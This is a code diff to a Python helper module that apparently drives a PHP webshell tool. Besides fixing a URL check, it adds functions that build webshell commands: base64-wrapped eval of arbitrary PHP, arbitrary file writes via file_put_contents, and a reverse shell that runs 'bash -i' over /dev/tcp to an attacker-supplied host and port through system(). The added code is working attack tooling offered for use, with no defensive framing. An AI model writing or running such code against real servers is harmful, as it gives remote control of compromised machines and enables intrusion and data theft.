@@ -28,7 +28,7 @@ def getMem(path, pwd):
 
 
 def getMemAuto(path, recvUrl, publicKey):
-    if recvUrl[:4] != "http://" and recvUrl[:4] != "https://":
+    if recvUrl[:7] != "http://" and recvUrl[:8] != "https://":
         raise Exception("Don't forget http schema")
     publicKey = publicKey.replace("\n", "\\n")
     return render('memAuto.php', path=path, recvUrl=recvUrl, publicKey=publicKey)
@@ -40,3 +40,17 @@ def b64d(text):
 
 def b64e(text):
     return b64encode(text.encode()).decode()
+
+
+def getEvalCommand(pwd, cmd):
+    return {"pwd": pwd, "cmd": f"eval(base64_decode({b64e(cmd)}));"}
+
+
+def getPutfileCommand(pwd, path, content):
+    content = b64e(content)
+    return {"pwd": pwd, "cmd": f"file_put_contents('{path}', base64_decode('{content}'));"}
+
+
+def getRevShell(pwd, lhost, lport, sysFunc="system"):
+    cmd = b64e(f"nohup bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &")
+    return {"pwd": pwd, "cmd": f"{sysFunc}(base64_decode('{cmd}'));"}
